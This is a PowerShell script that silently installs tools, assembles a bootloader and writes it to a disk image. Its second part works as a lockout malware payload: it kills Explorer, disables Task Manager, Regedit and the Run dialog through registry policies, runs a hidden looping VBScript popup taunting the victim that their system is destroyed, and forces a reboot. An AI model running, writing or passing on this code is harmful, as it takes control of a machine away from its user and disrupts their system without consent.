# Part 1: Check for NASM and Win32 Disk Imager, Download if Necessary

# Step 1: Check if NASM is installed
$nasmpath = Get-Command nasm -ErrorAction SilentlyContinue
if ($nasmpath -eq $null) {
    # Install NASM using Chocolatey package manager
    choco install nasm -y > $null 2>&1
}

# Step 2: Check if Win32 Disk Imager is installed, and download if necessary
$win32DiskImagerPath = "C:\Program Files (x86)\Win32DiskImager\Win32DiskImager.exe"
if (-Not (Test-Path $win32DiskImagerPath)) {
    # Download the latest version of Win32 Disk Imager
    $downloadUrl = "https://github.com/raspberrypi/Win32DiskImager/releases/download/v1.0.0/Win32DiskImager-1.0.0-install.exe"
    $installerPath = "$env:TEMP\Win32DiskImager-Installer.exe"
    
    # Download the installer
    Invoke-WebRequest -Uri $downloadUrl -OutFile $installerPath > $null 2>&1

    # Run the installer silently
    Start-Process -FilePath $installerPath -ArgumentList "/S" -Wait > $null 2>&1

    # Clean up the installer
    Remove-Item $installerPath -Force
}

# Step 3: Create the bootloader assembly file (boot.asm)
$assemblyCode = @"
; boot.asm - Custom bootloader displaying ASCII art
[bits 16]
[org 0x7C00]

start:
    ; Clear screen
    mov ah, 0x0E
    mov al, 0x0A
    int 0x10

    ; Print ASCII Art
    mov si, ascii_art
print_loop:
    lodsb
    or al, al
    jz end_print
    mov ah, 0x0E
    int 0x10
    jmp print_loop

end_print:
    ; Halt the system
    cli
hang:
    jmp hang

ascii_art:
    db "Your ASCII Art Here", 0
"@

# Write the assembly code to a file
$asmFilePath = "boot.asm"
$assemblyCode | Out-File -FilePath $asmFilePath -Encoding ASCII

# Step 4: Assemble the bootloader using NASM
$bootBinPath = "boot.bin"
nasm -f bin $asmFilePath -o $bootBinPath > $null 2>&1

# Step 5: Ask for Disk Image/Virtual Disk Path
$diskImagePath = Read-Host "Enter the full path of the disk image (e.g., C:\path\to\your\virtualdisk.img)"

# Step 6: Write the bootloader to the MBR using Win32 Disk Imager
Start-Process -FilePath $win32DiskImagerPath -ArgumentList "$diskImagePath", "$bootBinPath" -Wait > $null 2>&1

# Optional: Clean up assembly files
Remove-Item $asmFilePath -Force


# Part 2: Kill Explorer and Disable Task Manager, Regedit, and Run Dialog

# Kill Explorer
Stop-Process -Name "explorer" -Force

# Disable Task Manager, Regedit, and Run Dialog by modifying the registry
Set-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Policies\System" -Name "DisableTaskMgr" -Value 1 -Force
Set-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Policies\System" -Name "DisableRegistryTools" -Value 1 -Force
Set-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" -Name "NoRun" -Value 1 -Force

# Create VBScript to show Modeus-style error message and loop
$vbscriptPath = "$env:TEMP\error.vbs"

$vbscriptContent = @"
Set WshShell = CreateObject("WScript.Shell")
Do
    WshShell.Popup "Hehehe... Look at you, thinking you could just use your PC without consequences. You really thought you had control, didn''t you? Foolish... You''re trapped now, and there''s no escape. You''ve angered me, and now it''s time for your punishment. Windows? Ha! Your system is a fragile thing, so easy to break. It was doomed from the start, just like you. I warned you, but you didn''t listen. Every click, every action... You sealed your fate. You think you''re the one in charge, but no, I am. You can''t run away from me, you can''t fix this. Your computer is now mine, and it''s too late for you to change anything. The BCD is gone, your boot configuration is gone... and you? You''re stuck. So go ahead, try to reboot... but you won''t get anywhere. Your system is DONE. It''s too late to save yourself. Welcome to my domain.", 0, "Bye-bye sweetheart", 48
Loop
"@
Set-Content -Path $vbscriptPath -Value $vbscriptContent

# Run the VBScript silently in the background
Start-Process "wscript.exe" -ArgumentList $vbscriptPath -WindowStyle Hidden

# Force restart after 15 seconds
Start-Sleep -Seconds 15
Shutdown.exe /r /f /t 0
